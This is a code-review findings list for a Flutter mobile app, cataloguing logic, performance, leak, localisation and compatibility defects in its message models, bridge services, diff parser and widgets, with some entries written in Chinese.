- `G-2` **[logic]** `apps/mobile/lib/models/messages.dart:2842` — _stringMapSummary filter always true; renders 'a=null' to users
  '$k=$v' always contains '=' so .where(isNotEmpty) filters nothing; null values are shown as a=null instead of being stringified via _stringifyDetailValue.
- **[leak]** `apps/mobile/lib/models/messages.dart:3099` — _stringMapList returns mutable maps; QueuedInputItem.skills/mentions writable
  The helper returns mutable LinkedHashMap literals, so QueuedInputItem.skills/mentions can be mutated externally. Fix: wrap unmodifiable.
- `B-3` **[logic]** `apps/mobile/lib/models/messages.dart:3253` — Display-only time strings entirely unvalidated
  DebugTraceEvent.ts, DebugBundle createdAt/lastActivityAt, generatedAt, backedUpAt, syncedAt are as String? ?? '' with '' rendered blank; string-sorting the debug timeline would repeat the lexicographic bug.
- `G7` **[bug]** `apps/mobile/lib/models/messages.dart:4176` — RecordingInfo reads projectPath from meta but summary/prompts from top level
  If the Bridge nests summary/firstPrompt/lastPrompt in meta (naming strongly suggests so), those fields are always null and displayText degrades to name; json['meta'] is also a bare Map cast.
- `E1` **[logic]** `apps/mobile/lib/models/messages.dart:4221` — RecordingInfo.sizeLabel: negative renders '-42 B', no GB tier, verbatim dup
  10GB recordings show '10240.0 MB'; implementation is a byte-for-byte duplicate of ArtifactRef.sizeLabel — extract formatByteSize(int) with abs() and GB tier.
- `D3` **[logic]** `apps/mobile/lib/models/messages.dart:4332` — resumeCwd unvalidated against projectPath; stale worktree resumed from cache
  resumeCwd is preferred as cwd at resume with no containment or existence check and round-trips through the sqflite cache, so a deleted worktree path keeps being used for resume.
- `C-14` **[l10n]** `apps/mobile/lib/models/messages.dart:4490` — displayText 硬编码未本地化的 '(no description)'，且不区分三态
  messages.dart:4490-4494 与 session_card.dart:2896-2901（SessionDisplayMode.last 分支）各有一处硬编码英文字面量，未入 ARB。同时未按 v02-008 区分"尚未加载 / 权威空 / 解析失败"三态，用户无法判断是加载中还是真的没有描述。
- `G3` **[logic]** `apps/mobile/lib/models/messages.dart:4497` — Three handwritten copyWith styles with 27 fields each — silent field loss
  Adding a field requires syncing fromJson, two copyWith variants and toJson; a miss does not error, it silently drops the field. Freezed migration is the project's own convention.
- `B6` **[logic]** `apps/mobile/lib/models/messages.dart:4717` — copyWith(lastActivityAt) lacks monotonic guard inside the model
  Only the current single call site's _newerSessionActivity guard prevents out-of-order frames rolling activity time backwards; any new call site can silently regress it.
- `G4` **[bug]** `apps/mobile/lib/models/messages.dart:4851` — ClientMessage.raw drops delivery and shallow-copies nested structures
  Restored offline messages all become queued, so approveLiveOnly's never-replay invariant rests solely on the external type whitelist; Map.from shallow copy shares nested images/skills lists which bridge_service 3679-3686 mutates in place.
- `A9` **[bug]** `apps/mobile/lib/models/messages.dart:4854` — ClientMessage.type bare cast; one offline-queue restore path unprotected
  Truncated/old persisted rows without type throw; bridge_service 3132 has try/catch but 3687 (edit queued input) does not, so editing a queued input can throw.
- `G5` **[logic]** `apps/mobile/lib/models/messages.dart:5475` — Artifact-source validation duplicated; model copy is dead code that throws
  bridge_service.readArtifactSource performs the same check first, so the model-layer duplicate never fires — except for any caller bypassing the service, which then gets an uncaught ArgumentError.
- `G6` **[logic]** `apps/mobile/lib/models/messages.dart:5854` — ChatEntry sealed-but-implements; UserChatEntry has mutable fields
  All three impls use implements not extends and lack ==; UserChatEntry.status/messageUuid are mutable inside value-object lists — a state-management hazard; ClientMessageDelivery enum is weaker than its name implies.
- `B5` **[logic]** `apps/mobile/lib/models/messages.dart:5875` — timestampIsAuthoritative forced false when caller passes explicit timestamp
  Even when the passed timestamp is itself Bridge receivedAt, isAuthoritative is false; serverMessageTimestamp Expando is also looked up twice in one initializer.
- **[bug]** `apps/mobile/lib/providers/machine_manager_cubit.dart` — refreshLatestBridgeVersion consumes throttle on failure; waitUntilLoaded leaks subscription
  refreshLatestBridgeVersion records the attempt time before the request, so a failure still burns the 15-minute throttle window; waitUntilLoaded's firstWhere().timeout() leaks the underlying subscription after timeout.
- **[logic]** `apps/mobile/lib/providers/machine_manager_cubit.dart:89` — init() fire-and-forget without unawaited; constructor async failures unhandled
  init(); in the constructor is neither awaited nor wrapped in unawaited (line 95's refreshLatestBridgeVersion is), masking that construction-time async failures have no handler. Fix: unawaited(init()) with internal isClosed guards.
- **[logic]** `apps/mobile/lib/providers/machine_manager_cubit.dart:139` — Wall-clock DateTime.now() used for refresh throttle window
  Manual clock changes or DST/timezone shifts make DateTime.now().difference(lastAttempt) negative or huge, permanently disabling or enabling the throttle. Fix: Stopwatch or DateTime.timestamp() (UTC).
- **[leak]** `apps/mobile/lib/providers/machine_manager_cubit.dart:625` — _machinesSub?.cancel() not awaited in close()
  close() returns Future<void> and could await the cancellation; unawaited cancel can let late events race the close. Minor cleanup.
- **[bug]** `apps/mobile/lib/providers/server_discovery_cubit.dart` — ServerDiscoveryCubit: fire-and-forget startDiscovery, unguarded emit, unawaited cancel
  The constructor fires _service.startDiscovery() without awaiting, close() calls _sub?.cancel() unawaited before _service.dispose(), and listen(emit) lacks an isClosed guard, mirroring the StreamCubit defects.
- **[logic]** `apps/mobile/lib/providers/unseen_sessions_cubit.dart:81` — Persistence failures swallowed by catchError with no log or feedback
  Save-chain errors are silently discarded, so unread state silently vanishes on next launch with zero diagnostics. Fix: at least logger.warn.
- **[perf]** `apps/mobile/lib/providers/unseen_sessions_cubit.dart:97` — Full session-list copy on every snapshot push
  List<SessionInfo>.of(sessions) copies the whole list per push though the field is only needed for replay before _loaded; after load it could be nulled out. Avoidable O(n) allocation under frequent refresh.
- **[logic]** `apps/mobile/lib/providers/unseen_sessions_cubit.dart:205` — Timestamp comparisons fall back to lexicographic string compare
  _isAfter degrades to candidate.compareTo(baseline) when tryParse fails and _pruneSeenAt sorts raw strings; mixing Z with +09:00 offsets or differing fractional-second digits makes lexicographic order diverge from real time, corrupting unread markers and pruning wrong entries. Fix: normalize to toUtc().toIso8601String() at persist time.
- `E7` **[bug]** `apps/mobile/lib/screens/mock_preview_screen.dart:65` — 102 sites force-unwrap Theme.extension<AppColors>()!
  Currently safe because both light/dark themes register the extension, but any subtree wrapped in a local Theme(data: ThemeData(...)) (third-party components, previews, tests) makes all 102 sites throw null-check errors simultaneously. Provide AppColors.of(context) with a fallback.
- `R-8` **[bug]** `apps/mobile/lib/screens/qr_scan_screen.dart:37` — _onDetect 对无效码每帧都可能弹一次 SnackBar
  _hasPopped 只护住成功路径，扫到持续存在的无效码时按帧频率反复弹提示，界面被 SnackBar 淹没。需对无效提示加去抖。
- `A8` **[bug]** `apps/mobile/lib/screens/qr_scan_screen.dart:54` — Invalid-QR SnackBar hardcoded English and spams at camera frame rate
  The 'Not a valid CC Pocket connection QR code' SnackBar fires on every frame that detects a non-matching barcode, so pointing the camera at any unrelated QR floods the screen. Needs ARB wiring plus a >=2s debounce.
- **[bug]** `apps/mobile/lib/services/bridge_latest_version_service.dart` — dispose() during an in-flight fetch throws 'Client is already closed'
  Single-flight and caching are correct, but disposing the service while a fetch is in flight closes the HTTP client under the pending request, which then throws.
- `C-7` **[bug]** `apps/mobile/lib/services/bridge_service.dart:2004` — _clearBridgeScopedState 不重置 provider/namedOnly/searchQuery，跨 Bridge 泄漏过滤条件
  只重置 _currentProjectFilter。切换 Bridge 后、refreshCatalog 重发 switchFilter 之前的窗口内，requestRecentSessions() 会带上一台 Bridge 的过滤条件请求新 Bridge，返回错误的结果集。
- `R-7` **[perf]** `apps/mobile/lib/services/bridge_service.dart:3236` — resolveSessionLink 的 finally 对每条排队消息做 jsonDecode(toJson()) 只为读一个字段
  队列元素未保留结构化 tag，导致每次解析都要完整编解码一遍消息对象。队列长时开销随队列长度线性增长。
- `C-8` **[bug]** `apps/mobile/lib/services/bridge_service.dart:3400` — 遗留串行队列无超时 watchdog，一次错误响应即滞留所有后续目录请求
  _legacyRecentSessionsRequestInFlight 只在收到 recent_sessions 或重连时释放。旧 Bridge 以 error 响应或丢弃请求时，此后所有目录请求滞留队列直到重连，UI 骨架屏悬挂。
- `D-9` **[logic]** `apps/mobile/lib/services/chat_message_handler.dart:378` — default branch injects any unrecognized message into the chat transcript
  default: returns ChatStateUpdate adding ServerChatEntry(msg), so any newly added internal/infrastructure message type (like the specially-cased ArtifactResolvedMessage) pollutes the transcript by default. Default-suppress with a display whitelist is suggested.
- `F-4` **[bug]** `apps/mobile/lib/services/connection_url_parser.dart:64` — Port range validated only in the IPv6 branch; host:99999 accepted
  The plain host:port regex branch performs no port range check while the IPv6 branch validates 1-65535, so 'host:99999' is accepted and passed downstream. The report also flags that ccpocket://connect places no restriction on target host, needing a confirmation step at the call site.
- `M-10` **[bug]** `apps/mobile/lib/services/conversation_mirror_store.dart:986` — 删除与 vacuum 非事务组合，vacuum 抛错造成"删除失败"的假象
  vacuum 抛错时删除其实已生效，UI 报"存储操作失败"。vacuum 失败应仅记日志不向上抛。
- **[perf]** `apps/mobile/lib/services/database_platform_io.dart` — getPlatformDatabaseOpenConfig re-runs sqfliteFfiInit and directory I/O per call
  Every call performs sqfliteFfiInit() plus directory I/O (also triggered by getDbPath()), and the platform config likewise lacks onDowngrade, mirroring C-3.
- `D-10` **[bug]** `apps/mobile/lib/services/machine_manager_service.dart:731` — Version probe failure silently degrades with empty cache
  /version failures only log a warning and leave _versionCache empty, so the UI cannot distinguish 'not probed yet' from 'unsupported'.
- `B-14` **[logic]** `apps/mobile/lib/services/machine_manager_service.dart:847` — buildWsUrl unconditionally appends ?token= to the URL
  手工拼接凭据查询参数目前只因 machine.wsUrl 和 tunnel URL 不含既有 query
  才能工作；resolver 一旦返回带 query 的 URL 就会生成两个问号。应改用
  Uri.replace(queryParameters)。
- **[bug]** `apps/mobile/lib/services/mock_bridge_service.dart:470` — MockBridgeService.loadHistory missing isClosed guard; fired timers not reclaimed
  loadHistory lacks the isClosed guard that _scheduleMessage and requestFileList have; combined with an unmounted addPostFrameCallback in store_screenshot_extension it can throw 'Cannot add event after closing'. Fired timers in _timers are also never removed. Debug-only.
- `D-6` **[leak]** `apps/mobile/lib/services/notification_approval_coordinator.dart:310` — dispose cancels retry timer before subscription; race rebuilds untracked timer
  dispose() cancels _retryTimer then awaits _sessionSub.cancel(); a sessionList event landing between the two re-runs _drain() and recreates _retryTimer, which is then never cancelled. Cancel the subscription first or add a _disposed flag (the class has none).
- `D-4` **[bug]** `apps/mobile/lib/services/notification_service.dart:314` — show() silently no-ops when uninitialized; init failure mutes all notifications
  show() starts with if (!_initialized) return; and init() is called once in main.dart:134, so any exception there leaves the whole app permanently notification-silent with zero logging. At minimum a warning log is needed.
- `D-3` **[l10n]** `apps/mobile/lib/services/notification_service.dart:407` — Allow/Reject button labels use system locale and are registered only once
  Action labels come from PlatformDispatcher.instance.locale instead of the in-app appLocaleId, and DarwinNotificationCategory is registered only in init(); switching the app language does not update the buttons until reinstall/restart with a matching system language.
- `A-13` **[leak]** `apps/mobile/lib/services/performance_probe_extension.dart:43` — addTimingsCallback never removed; _samples unbounded (debug only)
  addTimingsCallback(_samples.addAll) is never unregistered and _samples has no cap, accumulating ~216k FrameTiming objects per hour at 60fps, freed only by manual reset(). kDebugMode-only, hence P3.
- `C-7` **[bug]** `apps/mobile/lib/services/prompt_history_service.dart:376` — bridgeUrl! null assertion rests on a fragile implicit contract
  The guard checks isConnected and bridgeId != null, but bridgeId can come from promptHistoryBridgeId independent of lastUrl. Currently _lastUrl is always set on connect so it does not crash, but the invariant is implicit and brittle.
- `C-9` **[logic]** `apps/mobile/lib/services/prompt_history_service.dart:435` — _pruneSyncStatuses deletes sync status of temporarily offline machines
  syncAll only adds machines with status == online to currentStatusIds, then _pruneSyncStatuses deletes rows not in the set. One transient offline round permanently erases that machine's last-sync time and entry counts.
- `C-8` **[bug]** `apps/mobile/lib/services/prompt_history_service.dart:713` — int.parse on legacy id suffix unguarded; polluted data throws FormatException
  Legacy ids are 'v1_<int>'; if persisted data is corrupted to 'v1_abc', int.parse(id.substring(3)) throws FormatException which bubbles to the UI layer.
- `A-14` **[leak]** `apps/mobile/lib/services/prompt_history_service.dart:802` — .first.timeout() leaks the underlying stream subscription on timeout
  promptHistorySyncResults.first.timeout(_syncTimeout) does not cancel the subscription created by .first; after a timeout the subscription lingers until the next result arrives.
- `S-17` **[bug]** `apps/mobile/lib/services/prompt_history_service.dart:1254` — _redactBridgeUrl 清了 query 但保留 userInfo，凭据仍留存
  `uri.replace(query: '')` 正确去掉 ?token=，但未清 userInfo；用户手输 ws://user:pass@host 时用户名密码仍写入 prompt history。
- `E-7` **[perf]** `apps/mobile/lib/services/prompt_history_service.dart:1272` — RegExp compiled inside per-entry loop in _displayMergeKey
  mergeEntriesForDisplay calls _displayMergeKey per record and each call constructs RegExp(r'\s+') anew; hoist to a static final.
- `E-9` **[perf]** `apps/mobile/lib/services/recording_loader.dart:42` — Recording file fully read then split('\n'); CRLF/trailing blank unhandled
  Large recording files briefly occupy double memory, and CRLF or trailing empty lines are not handled so downstream jsonDecode('') throws. Debug-only feature.
- **[bug]** `apps/mobile/lib/services/replay_bridge_service.dart` — ReplayBridgeService: send() lacks infrastructure-message filter; sentMessages unbounded
  send() does not reuse _isInfrastructureMessage, so list_sessions wrongly advances the replay chunk, and sentMessages grows without bound. Debug-only service.
- `E-8` **[perf]** `apps/mobile/lib/services/ssh_bridge_tunnel_service.dart:333` — Tunnel forwarding has no backpressure
  localSocket.listen(remoteSocket.sink.add) pipes both directions with no pause/resume, so large file transfers can accumulate unbounded data in memory.
- **[bug]** `apps/mobile/lib/services/store_screenshot_extension.dart:703` — addPostFrameCallback without mounted checks at 5 sites (debug-gated)
  Lines 703/767/1202/1206/1557 register post-frame callbacks without mounted checks (lines 542/939 have them), risking setState-after-dispose during screenshot flows. All kDebugMode-gated.
- `D8` **[bug]** `apps/mobile/lib/theme/app_theme.dart:295` — google_fonts fetches IBM Plex Sans/Space Grotesk over the network at runtime
  Only 3 monospace fonts are bundled and GoogleFonts.config.allowRuntimeFetching is never disabled, so first launch makes an HTTP request to fonts.gstatic.com (a third-party request needing privacy disclosure) and offline first launch falls back to system fonts. Bundle the fonts and disable runtime fetching, or document in the privacy policy.
- **[perf]** `apps/mobile/lib/utils/artifact_link_matcher.dart:36` — 2 regexes compiled per link with O(K*M) artifact matching per message
  _decodedSafeHref builds 2 RegExps per call and matchArtifactHref iterates all artifacts per link: K links x M artifacts means 2*K*M compilations plus K*M Uri.decodeFull calls per message render. Verified no ReDoS risk. Fix: hoist 4 regexes to top-level final; index artifacts by decoded href.
- **[bug]** `apps/mobile/lib/utils/artifact_link_matcher.dart:90` — isSafeProjectRelativePath admits drive-relative C:foo and ~/ paths
  RegExp(r'^[A-Za-z]:[\\/]') requires a separator after the drive letter, so Windows drive-relative 'C:foo\bar' passes as safe; '~/secret' also passes (out-of-tree if downstream shell-expands). Fix: also reject ^[A-Za-z]: and leading ~.
- **[perf]** `apps/mobile/lib/utils/codex_plan_update.dart:14` — itemPattern rebuilt per call; lazy (.+?)\s*$ causes O(n^2) backtracking
  The regex is constructed inside the function per invocation, and the lazy quantifier followed by \s*$ backtracks quadratically on very long lines (not catastrophic, but avoidable). Fix: top-level final with a greedy (.*\S) form.
- `E11` **[perf]** `apps/mobile/lib/utils/codex_plan_update.dart:15` — Mild quadratic regex backtracking (bounded inputs)
  (.+?)\\s*$ in codex_plan_update and (^|\\n)\\s*... in structured_error_inference 83-85; inputs are size-limited so low priority.
- **[perf]** `apps/mobile/lib/utils/command_parser.dart:4` — dotAll lazy command-name match is O(k*n) on unclosed tags, unbounded input
  Multiple unclosed <command-name> occurrences each scan to end of text, worst case O(k*n) on huge tool outputs; not catastrophic backtracking, and the regex is properly a top-level final, but a length cap is advisable.
- `G6` **[logic]** `apps/mobile/lib/utils/composer_tokens.dart:9` — ComposerToken marked @immutable but implements no ==/hashCode
  Sibling classes ComposerTokenConfig and ComposerTokenPalette both implement equality, but ComposerToken does not, so token-list comparisons degrade to reference identity and defeat change detection.
- `F4` **[compat]** `apps/mobile/lib/utils/composer_tokens.dart:43` — '$' trigger hardcoded to Provider.codex; third provider silently loses highlighting
  Both the trigger check and _resolveCategory compare directly against Provider.codex, so an additively introduced third provider gets no '$' token support with no signal. The trigger set should come from config rather than enum equality.
- `F06` **[compat]** `apps/mobile/lib/utils/composer_tokens.dart:46` — '$' trigger hard-bound to Provider.codex
  A third provider silently loses $-token support (46, 365-368).
- **[perf]** `apps/mobile/lib/utils/composer_tokens.dart:52` — ComposerTokenConfig equality does full SetEquality over per-build built Sets
  Caller builds fileMentions: projectFiles.toSet() (thousands of entries) every build and == compares 5 Sets element-wise — a per-frame thousand-element Set construction plus full comparison. Fix: version/identity token in equality instead of element-wise compare.
- `G06/G8` **[bug]** `apps/mobile/lib/utils/composer_tokens.dart:231` — updateTokenState mutates config/palette without notifyListeners
  The controller is a ValueNotifier but changing highlight config sends no notification, relying on the coincidence that the caller runs in build; if the call site moves (didChangeDependencies/callback) highlighting freezes on the old config until the next keystroke. Fix: notifyListeners on actual change (post-frame to avoid build-phase sync notify).
- `G9` **[l10n]** `apps/mobile/lib/utils/composer_tokens.dart:261` — No-token path drops IME composing underline, flickering during CJK input
  With no tokens, buildTextSpan returns a plain TextSpan discarding the composing-region underline, while the token path (L273-309) preserves it. During Chinese/Japanese composition the underline appears and disappears as tokens come and go.
- `G7` **[logic]** `apps/mobile/lib/utils/composer_tokens.dart:378` — Inconsistent set conventions: fileMentions stored bare, other token sets prefixed
  fileMentions is queried with rawText.substring(1) (no '@') while slashCommands/skillTokens/appTokens/pluginTokens store the full prefixed strings, making it easy for callers to populate the wrong form and silently break highlighting.
- **[bug]** `apps/mobile/lib/utils/debug_bundle_share.dart:11` — Bundle response race (sessionId-only match), blanket catch, no clipboard preview
  The subscription matches only bundle.sessionId with no request id, so a stale/concurrent bundle response completes the current completer; catch (_) at :44 collapses timeout/Clipboard/prompt errors into one message with no log. Clipboard content (remote absolute paths, history summary, up to 20000 chars of diff) is copied with no prior disclosure; verified no credential leak and no temp files.
- **[bug]** `apps/mobile/lib/utils/debug_bundle_share.dart:219` — _extractChangedFiles naive split(' ') breaks on paths containing spaces
  'diff --git a/My Project/a.md b/My Project/a.md' yields 6 parts and parts[2]='Project/a.md', writing wrong entries into the changed-files list sent to the agent, while diff_parser._extractFilePath already handles spaces/quotes/octal escapes. Fix: reuse _extractFilePath.
- `D07` **[bug]** `apps/mobile/lib/utils/debug_bundle_share.dart:227` — split(' ') on diff --git line breaks for paths with spaces
  'a/my file.txt' yields parts[2]=='a/my' → outputs 'my'; git C-quoted paths unhandled.
- `D8` **[compat]** `apps/mobile/lib/utils/diff_parser.dart:9` — Image extension whitelist not extensible: missing .heic/.heif/.avif/.tiff/.jfif
  The hardcoded extension set omits several image types, so when the Bridge additively adds them, the app renders binary image data as text. The set should be negotiable via Bridge capabilities or degrade via unknown-extension + isBinary heuristics.
- `G5` **[logic]** `apps/mobile/lib/utils/diff_parser.dart:81` — DiffLine/DiffHunk/DiffFile/DiffImageData lack ==/hashCode
  All four model classes rely on reference equality (DiffImageData even has copyWith), so cubit state comparisons and didUpdateWidget diffing either rebuild needlessly or miss real updates.
- `11/D-11/E8` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:164` — Combined-diff @@@ headers unmatched; no-newline marker lost in reconstruction
  Merge/combined diff @@@ headers silently fall back to start=1 breaking all line numbers, and '\ No newline at end of file' is skipped and lost by reconstructUnifiedDiff while trailing trimRight() (:663/:548) eats trailing spaces — a reconstructed diff fed to git apply would fail or corrupt. Current request_change callers only send it as text, limiting impact. Fix: noNewlineAtEof flag on DiffLine.
- `17/D-17` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:177` — CRLF diffs leave trailing \r; lone \r line shifts all following line numbers
  split('\n') leaves \r on every line of Windows-repo diffs (rendered as stray glyphs), and a bare "\r" fails the line.isEmpty check at :361 falling into the unknown-format-as-context branch, incrementing oldLine/newLine and offsetting all subsequent line numbers by 1. test/diff_parser_test.dart has zero CRLF cases. Fix: split(RegExp(r'\r?\n')).
- `16/D-16` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:199` — Renames and mode changes unrecognized; rendered as empty files
  The metadata loop only handles Binary files/new file mode/deleted file mode, not rename from|to, similarity index, old|new mode, or copy from|to. Pure renames or chmod-only changes produce a DiffFile with empty hunks rendered as a header with +0 -0 and blank body, and _extractFilePath keeps only the new path so the old name is lost.
- `E9` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:205` — Only 'Binary files' prefix detected; GIT binary patch renders as garbage
  git diff --binary emits 'GIT binary patch' + base85 blocks which get parsed as normal context/addition lines, rendering large garbage sections. Fix: also match 'GIT binary patch' and index...literal/delta forms.
- `19/D-19/G4` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:357` — '\ No newline at end of file' marker dropped; reconstructed patch adds a newline
  Lines starting with backslash are skipped with no field recording the marker, and reconstructDiff/reconstructUnifiedDiff use writeln for every line. Request Change on a file without trailing newline sends a semantically altered diff, and any future git apply of the reconstructed patch would fail.
- `G2` **[logic]** `apps/mobile/lib/utils/diff_parser.dart:532` — isBinary continue in reconstructDiff is unreachable dead code
  Binary files always have const [] hunks, so the preceding selectedHunks.isEmpty continue at L529 fires first and the isBinary check can never execute.
- `E7` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:548` — trimRight() on reconstructed patches strips required newline and meaningful whitespace
  Both DiffSelection (L548) and the header writer (L663) apply trimRight, removing the trailing newline patches require and any meaningful trailing whitespace on the last line (Markdown two-space breaks, whitespace fixes under diff). Only excess '\n' should be trimmed, keeping one.
- `G3` **[logic]** `apps/mobile/lib/utils/diff_parser.dart:609` — oldStart semantics inconsistent: 0 in _synthesizeWrite vs 1 elsewhere
  _synthesizeWrite uses oldStart:0 while _buildHunkFromStrings and _parseRawDiffLines use oldStart:1 for the same field, leaving three different conventions for identical semantics.
- `D08/D7` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:744` — Unconditional a/-b/ prefix strip eats a real top-level b/ directory
  _decodeGitPathToken strips leading 'a/'/'b/' regardless of context; in the bare-path branch (tool results carrying literal paths) a genuine top-level directory named b/ is removed, turning b/foo.dart into foo.dart.
- `G11` **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:23` — Window-index selector functions have no production callers
  selectTurnAwareServerMessageWindowIndexes and selectTurnAwareChatEntryWindowIndexes are used only by history_window_policy_test.dart and nowhere in lib/, making them dead production code that still must be maintained in sync.
- `E6` **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:57` — rootTurns clamped against entry count; zero yields empty window, negatives get default
  normalizedRootTurns.clamp(0, maxRetainedEntries) clamps a turn count by an entry count, and toolCalls/envelopeEntries are not clamped at all. rootTurns==0 makes _startOfLatestRootTurns return values.length so the whole window is empty, while negative values fall back to the default 5, an inverted semantic.
- `G10` **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:117` — ChatEntry to ServerMessage mapping duplicated verbatim in two places
  L117-131 and L159-173 repeat the identical mapping logic including the 'streaming-window-$index' id construction, so any change to one will inevitably be missed in the other.
- `G12` **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:340` — gapHost uses projected.length-1 relying on implicit just-added invariant
  _GapHost(projected.length - 1) depends on shouldRetainEnvelope having just appended a message; if that branch condition changes, the index becomes -1 and projected[host.outputIndex] throws RangeError at L385. The explicit outputIndex variable from L313 should be reused.
- `A6` **[bug]** `apps/mobile/lib/utils/history_window_policy.dart:386` — Bare cast to AssistantServerMessage relies on implicit invariants
  current.message as AssistantServerMessage is safe today only because all three host.outputIndex sources point at a just-added AssistantServerMessage, with L340's projected.length-1 as implicit coupling. Any new branch turns this into a runtime TypeError; pattern matching with skip would be safe.
- **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:401` — _hardCapProjectedMessages can exceed its own limit
  All UserInputMessage indexes are unconditionally added to selected before the limit-based fill, so when user messages alone exceed maxRetainedEntries (755) the result is longer than the limit — the hard cap is not hard. Fix: newest-first truncation for root turns too.
- **[logic]** `apps/mobile/lib/utils/network_endpoint.dart:6` — %25 replaceFirst hits first occurrence, single-layer decode; per-call RegExp
  replaceFirst replaces the first %25 anywhere rather than at the zone-separator position, so double-encoded fe80::1%2525en0 decodes only one layer; a new RegExp is built per call. Verified IPv6 zone-id/origin output is otherwise correct (Uri re-encodes % to %25), so scope is narrow.
- **[bug]** `apps/mobile/lib/utils/network_endpoint.dart:15` — bracketIpv6Host brackets anything containing ':' including host:port typos
  A user typing example.com:8080 in the host field yields [example.com:8080] then [example.com:8080]:8765 via formatHostPort, and the malformed endpoint only fails deep in the connection layer. Fix: probe with Uri.parseIPv6Address and surface an error for invalid input.
- `C10` **[logic]** `apps/mobile/lib/utils/network_endpoint.dart:29` — IPv6 zone id not lowercased; uniqueKey omits useSsl
  fe80::1%eth0 vs %ETH0 count as two machines; replaceFirst handles only the first %25; machine.uniqueKey is host:port only so ws and wss records dedupe into one.
- `F-3` **[logic]** `apps/mobile/lib/utils/network_endpoint.dart:115` — IPv6 bracketing inconsistent between formatHostPort and formatUriOrigin
  formatHostPort calls bracketIpv6Host explicitly while formatUriOrigin relies on Uri's internal bracketing over a de-bracketed host. Outputs match today, but zone-id link-local addresses (fe80::1%eth0, where normalizeHostInput restores %25 to %) are undefined behavior since a bare % is invalid in a Uri host.
- **[logic]** `apps/mobile/lib/utils/platform_helper_io.dart:4` — Local HOME used to shorten remote machine paths; Windows lacks HOME
  getHomeDirectory reads only HOME (empty on Windows; app-sandbox path on iOS/Android) and the sole caller shortenPath (session_list_screen.dart:182-189) shortens remote paths with the local home — silently never matching on mobile and potentially mis-shortening on desktop. Fix: use remote home from Bridge session info; USERPROFILE fallback.
- **[perf]** `apps/mobile/lib/utils/structured_error_inference.dart:9` — Full-message toLowerCase + ~25 contains scans + per-call regex compile
  Potentially long error text is lowercased whole then scanned ~25 times (O(25n)), and _looksLikePathNotAllowed compiles a regex per call, on a path that may run repeatedly during message rendering. Fix: hoist regex; cap matched prefix length.
- **[bug]** `apps/mobile/lib/utils/text_line_preview.dart:14` — CRLF content returns lines with trailing \r
  Same class of defect as diff_parser: line endings keep \r on CRLF input, which can render as stray characters. Logic otherwise verified correct with no bounds errors.
- `F3` **[compat]** `apps/mobile/lib/utils/tool_categories.dart:65` — Unknown and mcp__ tools all fall to 'other' losing icons and useful summaries
  The catch-all keeps additive safety but means future read/write-style tools and all MCP tools never get correct icons or _fileSummary output. An input-key heuristic (file_path implies read/write, command implies bash) would let unknown tools degrade usefully.
- `G05/G1` **[logic]** `apps/mobile/lib/utils/tool_categories.dart:126` — Dead code and duplicate implementations (aggregate)
  getToolCategoryColor 9-branch switch all return the same value; diff_parser:532 unreachable isBinary continue; duplicate sizeLabel; duplicate artifact validation (messages 5475); dead nullable/filter helpers; identical unarchive/delete branches; history_window_policy selectors with no production callers, duplicated ChatEntry mapping, and unexplained 755 magic number; three copyWith styles.
- `G14` **[perf]** `apps/mobile/lib/utils/tool_categories.dart:307` — _otherFullInput stringifies entire input; base64 payloads build tens-of-MB strings
  The fallback concatenates every key/value via toString() unconditionally, contradicting the stated policy of omitting large objects. Expanding a tool input containing a base64 image constructs a multi-tens-of-MB string in one shot on the main isolate.
- `A7` **[bug]** `apps/mobile/lib/utils/tool_categories.dart:317` — _jsonFallback's jsonEncode unprotected against non-encodable input values
  JsonEncoder.withIndent().convert(input) throws JsonUnsupportedObjectError when input contains custom objects or circular references; there is no try/catch fallback to input.toString().
- `E10/E12` **[l10n]** `apps/mobile/lib/utils/tool_categories.dart:350` — UTF-16 code-unit truncation can split surrogate pairs into tofu
  Three summary truncations use substring on code units (60/50 char cutoffs), which can cut an emoji or CJK-extension character in half, rendering a replacement box. Should truncate by grapheme cluster via the characters package.
- `M-6` **[bug]** `apps/mobile/lib/widgets/auxiliary_floating_dock.dart:73` — 悬浮 dock 位置无持久化，旋转后不重新贴边，键盘开合单向漂移
  (a) 切换 session 位置重置；(b) 竖屏右缘旋转到横屏后旧绝对 x 仍在范围内 → dock 悬在屏幕中间；(c) resizeToAvoidBottomInset 使 _top 被 clamp 上移，键盘收起后不回位。
- `M-7` **[bug]** `apps/mobile/lib/widgets/auxiliary_floating_dock.dart:78` — 悬浮 dock 未处理安全区，可落入 iOS home indicator 手势区与刘海区
  _top 上限为 height-56 且 body Stack 无 SafeArea（codex_session_screen.dart:1627-1630, 1907-1909），拖到最底部落在 home indicator 手势区；横屏时左右 8px 下限可能进入刘海区。clamp 边界应叠加 MediaQuery.paddingOf。
- `M-5` **[bug]** `apps/mobile/lib/widgets/auxiliary_floating_dock.dart:85` — 悬浮 dock 拖动无阈值，一次不稳的点击同时打开面板并把按钮贴边藏起
  onPointerMove 收到任意 delta 就置 _dragging=true，onPointerUp 即 _snap() 强制半隐藏；同时 InkWell 在 slop 内仍判定为 tap。应累计位移超 kTouchSlop 才进入 dragging。
- `M-12` **[bug]** `apps/mobile/lib/widgets/auxiliary_floating_dock.dart:159` — 无活动条目时用 colorScheme.error 红色徽标显示总条目数，语义混淆
  红色 + 数字通常暗示告警，而此处只是闲置条目计数，用户会误以为有错误待处理。
- `U-8` **[perf]** `apps/mobile/lib/widgets/message_bubble.dart:76` — ChatMessageTimestampData.fromEntry 对所有 entry 计算但约 80 个分支不消费
  死数据计算贯穿所有 ServerChatEntry；同时 hasTextContent 门槛使"无正文但有 artifacts"的 assistant 消息拿不到时间。需在 3.1 收尾时一并梳理归属闭环。
- `3.1-4` **[bug]** `apps/mobile/lib/widgets/tool_result_bubble.dart:281` — 图片结果三条渲染路径全部无时间
